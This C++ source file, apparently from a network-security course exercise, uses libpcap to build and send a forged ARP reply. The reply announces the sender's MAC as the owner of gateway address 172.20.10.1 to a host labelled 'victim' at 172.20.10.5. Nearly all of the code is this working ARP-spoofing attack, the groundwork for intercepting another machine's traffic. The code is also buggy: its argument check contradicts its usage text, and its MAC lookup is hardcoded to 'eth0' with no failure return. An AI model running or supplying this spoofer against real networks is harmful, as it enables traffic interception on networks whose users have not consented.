#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAC_LEN 6





#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
    printf("syntax: send-arp-test <interface> sender_IP victim_IP\n");
    printf("sample: send-arp-test wlan0 X.X.X.X X.X.X.X\n");
}


const char* get_mac(){
    char* addr = (char*)malloc(MAC_LEN * 3);
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "eth0");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        int size;
        size = sprintf(addr, "%02x:", (unsigned char)s.ifr_addr.sa_data[0]);
        for (i = 1; i < MAC_LEN; ++i){
            if (i != MAC_LEN - 1)
                size += sprintf(addr+size, "%02x:", (unsigned char)s.ifr_addr.sa_data[i]);
            else
                size += sprintf(addr+size, "%02x\0", (unsigned char)s.ifr_addr.sa_data[i]);
        }
        return addr;
    }
}


int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);  // need to modify
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    const char* my_mac = get_mac();

    EthArpPacket packet;

    packet.eth_.smac_ = Mac(my_mac);   // task 2 me
    packet.eth_.dmac_ = Mac("00:0f:00:c0:23:6f");   // victim lin
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    // packet.arp_.op_ = htons(ArpHdr::Request);    // task 1
    packet.arp_.op_ = htons(ArpHdr::Reply); //  task 2 : me like gateway
    // packet.arp_.sip_ = htonl(Ip("172.20.10.4"));
    // packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    // packet.arp_.tip_ = htonl(Ip("172.20.10.1"));
    packet.arp_.smac_ = Mac("08:00:27:1e:36:4a");   // task 2
    packet.arp_.sip_ = htonl(Ip("172.20.10.1"));
    packet.arp_.tmac_ = Mac("00:0f:00:c0:23:6f");   // victim lin
    packet.arp_.tip_ = htonl(Ip("172.20.10.5"));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    free((void*)my_mac);
}
